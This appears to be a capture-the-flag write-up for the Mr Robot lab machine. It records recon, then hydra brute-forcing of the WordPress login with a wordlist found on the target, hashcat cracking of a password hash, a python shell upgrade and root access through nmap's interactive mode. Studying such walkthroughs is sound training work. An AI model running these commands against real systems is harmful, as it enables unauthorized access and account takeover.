# Mr Robot CTF

### Recon

**nmap**

- 22 ssh closed
- 80 http open Apache httpd
- 443 ssl/http open Apache httpd

**Gobuster**

Identified Wordpress and PhpMyadmin CMS

/phpmyadmin only accessible using localhost, ssh tunnel?

fsocity.dic found in robots.txt, wordlist

**WPScan**

Wordpress user elliot found with hydra username enumeration

`hydra -L fsocity.dic -p test 10.10.215.227 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.89.107%2Fwp-admin%2F&testcookie=1:Invalid username" -V`

WP version: 4.3.1
Theme: twentyfifteen v1.3
Pagespeed version: 1.9.32.3-4523

XML-RPC enabled

Potential password attack with WPScan/hydra
Potential SQL injection

### Exploitation

Password attack with hydra, wordlist fsocity.dic found in robots.txt

`hydra -l elliot -P fsocity.dic 10.10.215.227 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.89.107%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V`

Found password for user elliot

### Privesc

Found robot home dir containing flag 2 and a raw-md5 password hash for user robot, cracked with hashcat

`hashcat -m 0 hash.txt rockyou.txt`

Upgrade reverse php shell to an interactive shell with python

`python -c 'import pty;pty.spawn("bin/bash")'`

su to robot and grab flag 2

Find any binaries with the suid bit set

`find / -type f -perm -04000 2>/dev/null`

Nmap is exploitable and gives us root

```
nmap --interactive
nmap> !sh
```
or
```
nmap --interactive
nmap>!bash -p
```

grab flag 3 from /root

### What is key 1?

Found in robots

### What is Key 2?

Found in /home/robot

### What is key 3?

Found in /root
